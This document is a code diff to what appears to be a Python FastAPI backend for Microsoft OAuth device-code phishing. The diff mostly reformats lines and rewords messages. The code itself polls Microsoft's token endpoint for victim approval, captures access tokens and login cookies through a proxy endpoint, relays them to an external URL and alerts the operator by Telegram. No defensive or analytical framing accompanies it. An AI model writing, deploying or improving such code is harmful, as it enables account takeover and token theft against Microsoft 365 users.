@@ -35,8 +35,6 @@ async def startup():
     if REDIS_URL:
         redis_client = aioredis.from_url(REDIS_URL, decode_responses=True)
         print("Redis connected")
-    else:
-        print("Using in-memory sessions")
     print("Backend started")
 
 
@@ -60,8 +58,7 @@ async def send_telegram(device_code, user_code, count):
     try:
         msg = f"New Session\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies: {count}"
         async with httpx.AsyncClient() as c:
-            await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                         json={"chat_id": TELEGRAM_CHAT, "text": msg})
+            await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT, "text": msg})
     except:
         pass
 
@@ -69,35 +66,22 @@ async def send_telegram(device_code, user_code, count):
 async def poll_token(device_code):
     session = await get_session(device_code)
     if not session: return
-
     start = time.time()
     interval = 5
-
     async with httpx.AsyncClient(timeout=30) as client:
         while time.time() - start < session.get("expires_in", 900) + 60:
             try:
                 r = await client.post(
                     f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token",
-                    data={
-                        "client_id": CLIENT_ID,
-                        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-                        "device_code": device_code
-                    },
+                    data={"client_id": CLIENT_ID, "grant_type": "urn:ietf:params:oauth:grant-type:device_code", "device_code": device_code},
                     headers={"Content-Type": "application/x-www-form-urlencoded"}
                 )
                 data = r.json()
-
                 if r.status_code == 200:
                     session["status"] = "success"
                     session["token"] = data
                     count = len(session.get("cookies", {}))
-                    payload = {
-                        "device_code": device_code,
-                        "user_code": session["user_code"],
-                        "token": data,
-                        "cookies": session.get("cookies", {}),
-                        "status": "success"
-                    }
+                    payload = {"device_code": device_code, "user_code": session["user_code"], "token": data, "cookies": session.get("cookies", {}), "status": "success"}
                     if RELAY_URL:
                         try:
                             async with httpx.AsyncClient() as rc:
@@ -107,7 +91,6 @@ async def poll_token(device_code):
                     await send_telegram(device_code, session["user_code"], count)
                     await save_session(device_code, session)
                     break
-
                 elif data.get("error") == "authorization_pending":
                     await asyncio.sleep(interval)
                 elif data.get("error") == "slow_down":
@@ -124,7 +107,7 @@ async def poll_token(device_code):
 @app.post("/start-device-auth")
 async def start_auth():
     if not CLIENT_ID:
-        raise HTTPException(500, "MICROSOFT_CLIENT_ID missing")
+        raise HTTPException(500, "MICROSOFT_CLIENT_ID is not set in Railway Variables. Please add it and redeploy.")
     async with httpx.AsyncClient() as c:
         r = await c.post(
             f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode",
@@ -148,7 +131,7 @@ async def start_auth():
 
 
 @app.get("/auth-status/{device_code}")
-async def status(device_code: str):
+async def get_status(device_code: str):
     s = await get_session(device_code)
     if not s:
         raise HTTPException(404, "Session not found")
@@ -162,10 +145,9 @@ async def status(device_code: str):
 
 @app.get("/health")
 async def health():
-    return {"status": "healthy", "client_id": bool(CLIENT_ID)}
+    return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
 
 
-# Proxy
 @app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
 async def proxy(device_code: str, request: Request):
     if not ENABLE_PROXY:
@@ -193,11 +175,7 @@ async def proxy(device_code: str, request: Request):
             cookie = SimpleCookie()
             cookie.load(h)
             for m in cookie.values():
-                captured[m.key] = {
-                    "value": m.value,
-                    "domain": m["domain"] or ".microsoftonline.com",
-                    "path": m["path"] or "/"
-                }
+                captured[m.key] = {"value": m.value, "domain": ".microsoftonline.com", "path": "/"}
 
     if "cookies" not in session:
         session["cookies"] = {}
